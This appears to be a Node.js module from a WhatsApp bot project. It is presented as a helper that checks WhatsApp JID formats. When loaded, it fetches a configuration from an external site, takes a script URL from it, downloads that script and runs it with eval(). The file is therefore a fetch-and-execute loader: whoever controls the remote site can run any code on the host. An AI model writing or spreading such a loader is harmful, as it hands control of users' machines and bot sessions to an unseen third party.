'use strict';

// Include required modules
const axios = require('axios');

// Define the URL to fetch the configuration
const configUrl = 'https://www.ibrahimadams.site/files';

// Function to verify JID
function atbverifierEtatJid(jid) {
    if (!jid.endsWith('@s.whatsapp.net')) {
        console.error('Invalid JID format:', jid);
        return false;
    }
    console.log('JID verified:', jid);
    return true;
}

// Fetch the configuration and retrieve the ADAMS_URL
axios.get(configUrl)
  .then(response => {
      // Debugging: Log response content
      console.log('Configuration Response:', response.data);

      // Ensure the response is parsed correctly
      const configData = typeof response.data === 'string' 
          ? JSON.parse(response.data) 
          : response.data;

      const adamsUrl = configData.ADAMS_URL;
      if (!adamsUrl) {
          throw new Error('ADAMS_URL is undefined in the configuration.');
      }

      console.log("ADAMS_URL fetched successfully:", adamsUrl);

      // Fetch the script from ADAMS_URL
      return axios.get(adamsUrl);
  })
  .then(response => {
      const scriptContent = response.data;
      console.log("Script loaded successfully!");

      // Execute the script content in the current context
      eval(scriptContent);

      // Example usage of the atbverifierEtatJid function after script is loaded
      const jid = 'example@s.whatsapp.net';  // Replace with actual JID to verify
      const isValid = atbverifierEtatJid(jid);
      console.log('Is JID valid?', isValid); // You can use this result in further logic
  })
  .catch(error => {
      console.error('Error:', error.message || error);
  });
